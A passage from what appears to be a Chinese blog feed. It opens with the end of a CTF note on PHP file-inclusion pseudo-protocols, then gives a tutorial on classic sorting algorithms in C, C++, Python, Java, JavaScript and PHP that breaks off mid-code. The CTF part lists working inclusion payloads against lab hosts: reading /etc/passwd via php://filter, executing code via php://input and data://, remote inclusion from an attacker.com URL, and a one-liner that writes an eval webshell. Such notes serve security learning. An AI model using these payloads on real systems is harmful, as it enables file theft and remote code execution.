**https:&#x2F;&#x2F;**：这些伪协议用于指定远程文件或资源的URL。攻击者可以通过指定远程恶意脚本或文件路径来进行远程文件包含攻击，例如使用<code>http://attacker.com/malicious.php</code>来包含攻击者控制的远程文件。</li><li>**data:&#x2F;&#x2F;**：该伪协议用于将数据直接嵌入到URL中。攻击者可以将恶意代码或文件内容嵌入到URL中，然后通过文件包含漏洞将其包含到应用程序中。</li><li><strong>php:&#x2F;&#x2F;</strong> 和 <strong>php:&#x2F;&#x2F;input</strong>：这些伪协议用于在PHP中进行特殊的文件操作。攻击者可以使用<code>php://filter</code>伪协议来执行各种操作，如读取文件内容、执行命令等。</li><li>**expect:&#x2F;&#x2F;**：该伪协议用于执行命令，通常在服务器上的某些环境中可用。攻击者可以通过构造恶意命令来执行操作。</li><li>**zip:&#x2F;&#x2F;**：zip伪协议用于指定包含在ZIP存档文件中的文件路径。攻击者可以构造一个恶意ZIP文件，其中包含恶意文件，并使用zip伪协议将其包含到应用程序中。</li><li>**phar:&#x2F;&#x2F;**：phar伪协议用于指定包含在PHAR存档文件中的文件路径。PHAR是一种自包含的PHP应用程序存档格式。攻击者可以构造一个恶意PHAR文件，其中包含恶意文件，并使用phar伪协议将其包含到应用程序中。</li></ol><table><thead><tr><th align="left">协议</th><th>条件</th><th>Linux环境示例</th><th>Window环境示例</th></tr></thead><tbody><tr><td align="left"><strong>file:&#x2F;&#x2F;——访问本地文件系统</strong></td><td>allow_url_fopen:  off&#x2F;on allow_url_include:  off&#x2F;on</td><td><a href="http://127.0.0.1/FI/LFI.php?file=**file:///etc/passwd**http://127.0.0.1/FI/LFI.php?file=**file:///var/www/html/1.txt">http://127.0.0.1/FI/LFI.php?file=**file:///etc/passwd**http://127.0.0.1/FI/LFI.php?file=**file:///var/www/html/1.txt</a>**</td><td><a href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**file:///C:%5CDVWA-master%5Cvulnerabilities%5Cfi%5C1.txt%EF%BC%88%E7%BB%9D%E5%AF%B9%E4%BD%8D%E7%BD%AE%EF%BC%89">http://192.168.6.128:8001/vulnerabilities/fi/?page=**file:///C:\DVWA-master\vulnerabilities\fi\1.txt（绝对位置）</a>**</td></tr><tr><td align="left">php:&#x2F;&#x2F;——访问各个输入流&#x2F;输出流(I&#x2F;O streams)。CTF中常用以下两个。①<strong>php:&#x2F;&#x2F;input</strong>：将POST输入流当做PHP代码执行。②<strong>php:&#x2F;&#x2F;filter</strong>：是一种元封装器，作用是作为一个“中间流”来处理其他流。</td><td>①<strong>php:&#x2F;&#x2F;input</strong>：allow_url_fopen:  off&#x2F;on allow_url_include:  on          ②<strong>php:&#x2F;&#x2F;filter</strong>：allow_url_fopen:  off&#x2F;on allow_url_include:  off&#x2F;on</td><td>① <a href="http://127.0.0.1/FI/LFI.php?file=**php://input**Post">http://127.0.0.1/FI/LFI.php?file=**php://input**Post</a> Data：<strong>需要执行的木马</strong>②(1)<a href="http://127.0.0.1/FI/LFI.php?file=**php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd**(2)http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=./1.txt">http://127.0.0.1/FI/LFI.php?file=**php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd**(2)http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=./1.txt</a>**  #相对位置(3)<a href="http://127.0.0.1/FI/LFI.php?file=**php://filter/resource=file:///etc/passwd">http://127.0.0.1/FI/LFI.php?file=**php://filter/resource=file:///etc/passwd</a>**</td><td>① <a href="http://127.0.0.1/FI/LFI.php?file=**php://input**Post">http://127.0.0.1/FI/LFI.php?file=**php://input**Post</a> Data：需要执行的木马②<a href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=file:///C:%5CDVWA-master%5Cvulnerabilities%5Cfi%5C1.txt">http://192.168.6.128:8001/vulnerabilities/fi/?page=**php://filter/resource=file:///C:\DVWA-master\vulnerabilities\fi\1.txt</a>**  #php：&#x2F;&#x2F;filter作为中间流处理绝对位置</td></tr><tr><td align="left">data:&#x2F;&#x2F;——数据（RFC 2397）</td><td>allow_url_fopen: on&#x2F;off  allow_url_include:  on</td><td>2种用法（和php:&#x2F;&#x2F;input一样执行木马。**<?php**  **fputs(fopen(‘shell.php’,’w’),”<?php @eval($_POST[x]);?>”)?&gt;<strong>可生成木马在同一目录）①</strong>data:&#x2F;&#x2F;text&#x2F;plain，木马**<a href="http://127.0.0.1/include.php?file=**data://text/plain">http://127.0.0.1/include.php?file=**data://text/plain</a>,<?php%20phpinfo();?><strong>②</strong>data:&#x2F;&#x2F;text&#x2F;plain;base64，64位木马**<a href="http://127.0.0.1/include.php?file=**data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+">http://127.0.0.1/include.php?file=**data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</a>**</td><td></td></tr><tr><td align="left">http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;——常规URL形式，允许通过HTTP 1.0的GET方法，以只读的身份访问文件和资源。常用于远程包含。</td><td>allow_url_fopen: on allow_url_include:  on</td><td>方法与window的②类似</td><td>①端口开启http服务监听。Win+R，cmd命令行输入：<strong>python -m</strong>  <strong>SimpleHTTPServer 端口号</strong>② <a href="http://192.168.6.128:8001/vulnerabilities/fi/?page=**http://192.168.6.128:%E7%AB%AF%E5%8F%A3%E5%8F%B7/desktop/shell.jpg%EF%BC%88%E5%8C%85%E5%90%ABphp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%89">http://192.168.6.128:8001/vulnerabilities/fi/?page=**http://192.168.6.128:端口号/desktop/shell.jpg（包含php一句话木马的图片马）</a>**</td></tr><tr><td align="left">zip:&#x2F;&#x2F; &amp;  bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; ——均属于压缩流，可以访问压缩文件的所有子文件(无论任意后缀，如jpg&#x2F;php&#x2F;png&#x2F;xxx)</td><td>allow_url_fopen: on&#x2F;off allow_url_include:  on&#x2F;off</td><td>略</td><td>①<strong>zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]<strong>（在windows测试下，5.3.0&lt;php版本&lt;5.4，且#编码为%23）。例子，压缩phpinfo.txt为phpinfo.zip，压缩包重命名为phpinfo.jpg，并上传。<a href="http://127.0.0.1/include.php?file=**zip://C:%5Cdesktop%5Cphpinfo.jpg%23phpinfo.txt">http://127.0.0.1/include.php?file=**zip://C:\desktop\phpinfo.jpg%23phpinfo.txt</a>** ②</strong>compress.bzip2:&#x2F;&#x2F;FilePath(绝对路径)&#x2F;filename.bz2</strong>    压缩phpinfo.txt为phpinfo.bz2并上传（同样支持任意后缀名）<a href="http://127.0.0.1/include.php?file=**compress.bzip2://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.bz2">http://127.0.0.1/include.php?file=**compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</a>** ③<strong>compress.zlib:&#x2F;&#x2F;file.gz</strong>     压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）<a href="http://127.0.0.1/include.php?file=**compress.zlib://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.gz">http://127.0.0.1/include.php?file=**compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</a>**</td></tr><tr><td align="left">phar:&#x2F;&#x2F;——与zip:&#x2F;&#x2F;协议类似，同样可以可以访问zip格式压缩包内容。（php版本&gt;5.3.0）</td><td>allow_url_fopen: on&#x2F;off allow_url_include:  on</td><td>例子，压缩1.php为1.zip，压缩包重命名为1.png，并上传。<a href="http://127.0.0.1/include.php?file=**phar://upload/1.png/1.php">http://127.0.0.1/include.php?file=**phar://upload/1.png/1.php</a>**  #相对位置</td><td>例子，压缩1.php为1.zip，压缩包重命名为1.png，并上传。<a href="http://192.168.131.133:8082/vulnerabilities/fi/?page=**phar://C:%5CUsers%5CCISP-PTE%5CDesktop%5C22.png%5C22.jpg">http://192.168.131.133:8082/vulnerabilities/fi/?page=**phar://C:\Users\CISP-PTE\Desktop\22.png\22.jpg</a>**  #绝对位置</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大经典排序算法</title>
      <link href="/2023/12/06/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2023/12/06/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="十大经典排序算法："><a href="#十大经典排序算法：" class="headerlink" title="十大经典排序算法："></a>十大经典排序算法：</h2><h3 id="一、冒泡排序"><a href="#一、冒泡排序" class="headerlink" title="一、冒泡排序"></a>一、冒泡排序</h3><h4 id="1-算法步骤"><a href="#1-算法步骤" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</p><p>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</p><p>针对所有的元素重复以上的步骤，除了最后一个。</p><p>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</p><h4 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C："><a href="#C：" class="headerlink" title="C："></a>C：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i, j, temp;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">                        <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                                temp = arr[j];</span><br><span class="line">                                arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                                arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> arr[] = &#123; <span class="number">22</span>, <span class="number">34</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">82</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">64</span>, <span class="number">35</span>, <span class="number">9</span>, <span class="number">70</span> &#125;;</span><br><span class="line">        <span class="type">int</span> len = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">        bubble_sort(arr, len);</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-："><a href="#C-：" class="headerlink" title="C++："></a>C++：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; <span class="comment">//整数或浮点数皆可使用,若要使用类(class)或结构体(struct)时必须重载大于(&gt;)运算符</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bubble_sort</span><span class="params">(T arr[], <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">                        <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])</span><br><span class="line">                                <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> arr[] = &#123; <span class="number">61</span>, <span class="number">17</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">34</span>, <span class="number">60</span>, <span class="number">72</span>, <span class="number">21</span>, <span class="number">50</span>, <span class="number">1</span>, <span class="number">62</span> &#125;;</span><br><span class="line">        <span class="type">int</span> len = (<span class="type">int</span>) <span class="built_in">sizeof</span>(arr) / <span class="built_in">sizeof</span>(*arr);</span><br><span class="line">        <span class="built_in">bubble_sort</span>(arr, len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">                cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">        <span class="type">float</span> arrf[] = &#123; <span class="number">17.5</span>, <span class="number">19.1</span>, <span class="number">0.6</span>, <span class="number">1.9</span>, <span class="number">10.5</span>, <span class="number">12.4</span>, <span class="number">3.8</span>, <span class="number">19.7</span>, <span class="number">1.5</span>, <span class="number">25.4</span>, <span class="number">28.6</span>, <span class="number">4.4</span>, <span class="number">23.8</span>, <span class="number">5.4</span> &#125;;</span><br><span class="line">        len = (<span class="type">float</span>) <span class="built_in">sizeof</span>(arrf) / <span class="built_in">sizeof</span>(*arrf);</span><br><span class="line">        <span class="built_in">bubble_sort</span>(arrf, len);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">                cout &lt;&lt; arrf[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bubbleSort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(arr)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(arr)-i):</span><br><span class="line">            <span class="keyword">if</span> arr[j] &gt; arr[j+<span class="number">1</span>]:</span><br><span class="line">                arr[j], arr[j + <span class="number">1</span>] = arr[j + <span class="number">1</span>], arr[j]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h5 id="Java："><a href="#Java：" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="comment">// 设定一个标记，若为true，则表示此次循环没有进行交换，也就是待排序列已经有序，排序已经完成。</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                    arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = tmp;</span><br><span class="line"></span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="JavaScript："><a href="#JavaScript：" class="headerlink" title="JavaScript："></a>JavaScript：</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">bubbleSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> len = arr.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j+<span class="number">1</span>]) &#123;        <span class="comment">// 相邻元素两两对比</span></span><br><span class="line">                <span class="keyword">var</span> temp = arr[j+<span class="number">1</span>];        <span class="comment">// 元素交换</span></span><br><span class="line">                arr[j+<span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="PHP："><a href="#PHP：" class="headerlink" title="PHP："></a>PHP：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span> - <span class="number">1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$len</span> - <span class="number">1</span> - <span class="variable">$i</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$arr</span>[<span class="variable">$j</span>] &gt; <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="variable">$arr</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="variable">$arr</span>[<span class="variable">$j</span>] = <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>];</span><br><span class="line">                <span class="variable">$arr</span>[<span class="variable">$j</span>+<span class="number">1</span>] = <span class="variable">$tmp</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$arr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二、选择排序"><a href="#二、选择排序" class="headerlink" title="二、选择排序"></a>二、选择排序</h3><h4 id="1-算法步骤-1"><a href="#1-算法步骤-1" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。</p><p>再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。</p><p>重复第二步，直到所有元素均排序完毕。</p><h4 id="2-代码实现-1"><a href="#2-代码实现-1" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C：-1"><a href="#C：-1" class="headerlink" title="C："></a>C：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> *b)</span> <span class="comment">//交换两个数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">selection_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; len - <span class="number">1</span> ; i++) </span><br><span class="line">    &#123;</span><br><span class="line">                <span class="type">int</span> min = i;</span><br><span class="line">                <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; len; j++)     <span class="comment">//遍历未排序的元素</span></span><br><span class="line">                        <span class="keyword">if</span> (arr[j] &lt; arr[min])    <span class="comment">//找到目前最小值</span></span><br><span class="line">                                min = j;    <span class="comment">//记录最小值</span></span><br><span class="line">                swap(&amp;arr[min], &amp;arr[i]);    <span class="comment">//交换位置</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-：-1"><a href="#C-：-1" class="headerlink" title="C++："></a>C++：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt; <span class="comment">//整数和浮点数都可以使用，若要使用class时必须设置&gt;的运算功能</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">selection_sort</span><span class="params">(std::vector&lt;T&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="type">int</span> min = i;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; arr.<span class="built_in">size</span>(); j++)</span><br><span class="line">                        <span class="keyword">if</span> (arr[j] &lt; arr[min])</span><br><span class="line">                                min = j;</span><br><span class="line">                std::<span class="built_in">swap</span>(arr[i], arr[min]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-1"><a href="#Python：-1" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">selectionSort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr) - <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 记录最小数的索引</span></span><br><span class="line">        minIndex = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[j] &lt; arr[minIndex]:</span><br><span class="line">                minIndex = j</span><br><span class="line">        <span class="comment"># i 不是最小数时，将 i 和最小数进行交换</span></span><br><span class="line">        <span class="keyword">if</span> i != minIndex:</span><br><span class="line">            arr[i], arr[minIndex] = arr[minIndex], arr[i]</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h5 id="Java：-1"><a href="#Java：-1" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SelectionSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 总共要经过 N-1 轮比较</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> i;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 